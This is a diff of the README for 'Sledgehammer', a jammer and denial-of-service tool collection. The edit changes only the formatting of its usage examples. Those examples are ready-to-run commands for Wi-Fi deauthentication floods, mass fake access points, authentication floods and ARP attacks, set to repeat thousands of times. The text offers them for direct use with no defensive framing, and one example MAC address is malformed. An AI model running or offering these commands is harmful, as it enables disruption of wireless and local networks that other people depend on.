@@ -16,17 +16,17 @@ Sledgehammer is collection of Jammer/DoS tools for various protocols. Those incl
 Just download and execute.
 
 ### Usage examples
-Get general help via: python sledgehammer.py --help
+Get general help via 'python sledgehammer.py --help'.
 Depending on attack mode parameters can vary. See mode-parameters for more info.
 
 - WiFI DoS via smart deauthentication
-  python sledgehammer.py --mode wifi_deauth --iface_name wlan1 --count 9999
+python sledgehammer.py --mode wifi_deauth --iface_name wlan1 --count 9999
 
 - WiFi DoS via mass fake APs
-  python sledgehammer.py --mode wifi_ap --iface_name wlan1 --channels 1 --count 9999
+python sledgehammer.py --mode wifi_ap --iface_name wlan1 --channels 1 --count 9999
 
 - WiFi DoS via mass auth
-  python sledgehammer.py --mode wifi_auth --iface_name wlan1 --mac_dst 00:11:22:33:44:55:66 --channels 4 --count 9999
+python sledgehammer.py --mode wifi_auth --iface_name wlan1 --mac_dst 00:11:22:33:44:55:66 --channels 4 --count 9999
 
 - ARP
   python sledgehammer.py --mode arp --iface_name wlan1 --mac_dst 00:11:22:33:44:55 --ip_dst 192.168.178.1
